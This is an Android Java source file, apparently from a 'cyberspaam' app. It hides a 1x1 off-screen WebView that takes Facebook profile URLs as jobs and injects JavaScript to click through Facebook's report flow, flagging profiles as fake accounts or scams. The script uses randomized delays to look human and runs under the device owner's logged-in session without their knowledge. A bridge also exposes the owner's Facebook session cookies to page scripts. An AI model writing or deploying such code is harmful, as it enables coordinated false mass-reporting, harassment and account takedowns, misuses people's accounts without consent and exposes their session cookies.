// language: Java, file: android-src/MainActivity.java
package com.cyberspaam.app;

import android.os.Bundle;
import android.webkit.CookieManager;
import android.webkit.WebView;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebViewClient;
import android.webkit.WebChromeClient;
import com.getcapacitor.BridgeActivity;

public class MainActivity extends BridgeActivity {
    
    WebView worker;
    String currentJobId = null;

    // ফেসবুক অটো-রিপোর্ট করার জাভাস্ক্রিপ্ট (সব ধাপ এখানে আছে)
    static final String REPORT_JS = "(function(){var JOB='__JOB__';"
        + "var sleep=function(ms){return new Promise(function(r){setTimeout(r,ms)})};"
        + "var rnd=function(a,b){return Math.floor(Math.random()*(b-a+1)+a)*1000};"
        + "var find=function(re){var els=document.querySelectorAll('div[role=\"button\"],div[role=\"menuitem\"],a,button,[role=\"link\"]');"
        + "for(var i=0;i<els.length;i++){var e=els[i];var t=((e.innerText||'')+' '+(e.getAttribute('aria-label')||'')).trim();"
        + "if(t&&re.test(t)&&e.offsetParent!==null)return e}return null};"
        + "var click=async function(pats,to){to=to||12000;var s=Date.now();"
        + "while(Date.now()-s<to){for(var i=0;i<pats.length;i++){var e=find(pats[i]);"
        + "if(e){e.scrollIntoView({block:'center'});await sleep(rnd(0.4,0.9));e.click();return true}}"
        + "await sleep(500)}return false};"
        + "(async function(){try{await sleep(rnd(2,4));window.scrollBy(0,300);await sleep(rnd(1,2));"
        + "if(!(await click([/^More$/i,/More options/i,/See options/i,/Actions for this profile/i,/\u22ef/])))throw 'no_more_button';"
        + "await sleep(rnd(1,2));"
        + "if(!(await click([/Find support or report/i,/Report profile/i,/^Report$/i])))throw 'no_report_option';"
        + "await sleep(rnd(1.5,3));"
        + "await click([/Fake account/i,/Pretending to be/i,/Scam/i,/False information/i]);"
        + "await sleep(rnd(1,2));"
        + "for(var k=0;k<2;k++){await click([/^Next$/i,/^Continue$/i,/^Submit$/i,/^Done$/i]);await sleep(rnd(1,2))}"
        + "await sleep(rnd(2,3));"
        + "var ok=/Thanks for reporting|We received your report|report has been submitted|Your report has been sent/i.test(document.body.innerText);"
        + "if(window.AndroidWorker) window.AndroidWorker.finish(ok,JOB,'');"
        + "}catch(e){if(window.AndroidWorker) window.AndroidWorker.finish(false,JOB,e.toString())}})();";

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // ১. মেইন WebView সেটআপ
        WebView mainWebView = getBridge().getWebView();
        WebSettings webSettings = mainWebView.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);

        CookieManager cookieManager = CookieManager.getInstance();
        cookieManager.setAcceptCookie(true);
        cookieManager.setAcceptThirdPartyCookies(mainWebView, true);

        // মেইন WebView-তে কুকি ব্রিজ
        mainWebView.addJavascriptInterface(new Object() {
            @JavascriptInterface
            public String getFbCookie() {
                CookieManager cm = CookieManager.getInstance();
                String cookie = cm.getCookie("https://m.facebook.com");
                if (cookie == null || cookie.isEmpty() || !cookie.contains("c_user")) {
                    cookie = cm.getCookie("https://www.facebook.com");
                }
                return (cookie != null) ? cookie : "";
            }

            @JavascriptInterface
            public String getDeviceName() {
                String manufacturer = android.os.Build.MANUFACTURER;
                String model = android.os.Build.MODEL;
                return manufacturer.substring(0, 1).toUpperCase() + manufacturer.substring(1) + " " + model;
            }
        }, "AndroidCookieManager");

        // ═══ ২. হিডেন ওয়ার্কার WebView সেটআপ ═══
        worker = new WebView(this);
        WebSettings workerSettings = worker.getSettings();
        workerSettings.setJavaScriptEnabled(true);
        workerSettings.setDomStorageEnabled(true);
        workerSettings.setDatabaseEnabled(true);
        workerSettings.setCacheMode(WebSettings.LOAD_DEFAULT);
        workerSettings.setMediaPlaybackRequiresUserGesture(false);
        
        // ওয়ার্কারেও মেইন WebView-এর কুকি পাস করা
        cookieManager.setAcceptThirdPartyCookies(worker, true);

        worker.setWebChromeClient(new WebChromeClient());
        worker.addJavascriptInterface(new WorkerBridge(), "AndroidWorker");

        worker.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {
                if (currentJobId == null) return;
                if (!url.contains("facebook.com")) return;
                // রিডাইরেক্ট বা লগইন পেজ হলে অপেক্ষা করবে
                if (url.contains("/share/") || url.contains("/login") || url.contains("/checkpoint")) {
                    return; 
                }
                final String job = currentJobId;
                currentJobId = null;
                // পেজ লোড হওয়ার ৩ সেকেন্ড পর রিপোর্ট জাভাস্ক্রিপ্ট রান করবে
                view.postDelayed(() -> view.evaluateJavascript(REPORT_JS.replace("__JOB__", job), null), 3000);
            }
        });

        // স্ক্রিনের বাইরে ১x১ পিক্সেলে ওয়ার্কার WebView লোড করা (ইউজার দেখতে পাবে না)
        android.view.ViewGroup parent = (android.view.ViewGroup) mainWebView.getParent();
        android.widget.FrameLayout.LayoutParams lp = new android.widget.FrameLayout.LayoutParams(1, 1);
        lp.leftMargin = -10; 
        lp.topMargin = -10;
        parent.addView(worker, lp);

        // worker.html লোড করা
        worker.loadUrl("file:///android_asset/public/worker.html");
    }

    // ওয়ার্কার ব্রিজ ক্লাস (JS থেকে কম্যান্ড রিসিভ করবে)
    class WorkerBridge {
        @JavascriptInterface
        public void navigate(String payload) {
            String[] p = payload.split("\\|", 2);
            if (p.length < 2) return;
            currentJobId = p[1];
            runOnUiThread(() -> worker.loadUrl(p[0]));
        }

        @JavascriptInterface
        public void finish(boolean ok, String jobId, String err) {
            String error = (err == null) ? "" : err;
            runOnUiThread(() -> worker.loadUrl("file:///android_asset/public/worker.html#" + jobId + ":" + (ok ? "1" : "0") + ":" + error));
        }
    }
            }
